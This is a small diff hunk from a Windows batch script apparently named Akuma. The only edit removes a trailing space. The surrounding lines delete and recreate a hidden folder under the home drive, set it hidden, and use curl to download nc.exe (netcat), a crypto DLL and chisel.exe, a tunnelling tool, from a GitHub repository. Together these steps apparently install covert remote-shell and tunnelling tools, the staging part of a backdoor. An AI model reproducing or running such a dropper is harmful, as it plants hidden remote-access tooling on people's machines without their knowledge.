@@ -5,7 +5,7 @@ rmdir /s /q %homedrive%\Akuma
 mkdir %homedrive%\Akuma
 attrib +h %homedrive%\Akuma
 cd %homedrive%\Akuma
-mkdir %homedrive%\Akuma\nc 
+mkdir %homedrive%\Akuma\nc
 curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/nc.exe > %homedrive%\Akuma\nc\nc.exe
 curl -L https://github.com/l-urk/Akuma/raw/main/dll/libcrypto-3.dll > %homedrive%\Akuma\nc\libcrypto-3.dll
 curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/chisel.exe > chisel.exe
